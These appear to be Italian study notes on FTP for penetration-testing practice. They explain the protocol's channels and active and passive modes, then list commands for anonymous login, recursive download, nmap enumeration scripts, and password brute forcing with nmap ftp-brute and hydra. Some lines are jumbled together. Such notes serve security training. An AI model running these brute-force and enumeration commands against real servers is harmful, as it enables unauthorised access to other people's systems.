Immaginiamo di voler caricare file locali su un server e scaricare altri file utilizzando il protocollo FTP . In una connessione FTP vengono aperti due canali. Innanzitutto, il client e il server stabiliscono un canale di controllo TCP port 21. Il client invia comandi al server e il server restituisce i codici di stato. Quindi entrambi i partecipanti alla comunicazione possono stabilire il canale dati tramite TCP port 20. 
Questo canale viene utilizzato esclusivamente per la trasmissione dei dati e il protocollo controlla gli errori durante questo processo. Se durante la trasmissione il collegamento viene interrotto, il trasporto può essere ripreso dopo aver ristabilito il contatto.  
Viene fatta una distinzione tra active/passive. Nella variante attiva il client stabilisce la connessione come descritto tramite la porta TCP 21 e informa così il server tramite quale porta lato client il server può trasmettere le sue risposte. Tuttavia, se un firewall protegge il client, il server non può rispondere perché tutte le connessioni esterne sono bloccate. A questo scopo, il passive modeè stato sviluppato. Qui il server annuncia una porta attraverso la quale il client può stabilire il canale dati. Poiché il client avvia la connessione con questo metodo, il firewall non blocca il trasferimento.

```
Try Anonymous login:
> ftp 192.217.238.3

Command:

Status del server:
> status

Comando utile che permette di attivare funzionalità più estese per rilevare più informazioni:
> debug  

Comando utile che permette di attivare funzionalità più estese per rilevare più informazioni:
> trace

Lista tutto l'albero di una directory:
> ls –R:

Download documents:
> get "nomeFile"

Scarico tutto all directories:
> wget –m –no-passive ftp://anonymous:anonymous@ip

> put: Carico file /usr/share/nmap/scripts/ : Motore nse (scripting nmap) che offre script nmap sul servizio ftp (-sC) scansione script predefinita e --script-trace stat: Restituisce informazioni sullo stato del server FTP
```
#### ftp nmap scripts
```
ALL Ftp scripts:
> find /usr/share/nmap/scripts -type f -name *ftp* 2>/dev/null

> nmap -p21 -sV -sC -O 192.217.238.3

FTP nmap bruteforcing
> nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3 - nmap to brute password

Retrieve information about server FTP version:
> nmap --script ftp-syst -p21 192.217.238.3

Verify login anonymous available
> nmap --script ftp-anon -p21 192.119.169.3

```

#### hydra
```
Hydra bruteforce login:
> hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp
```

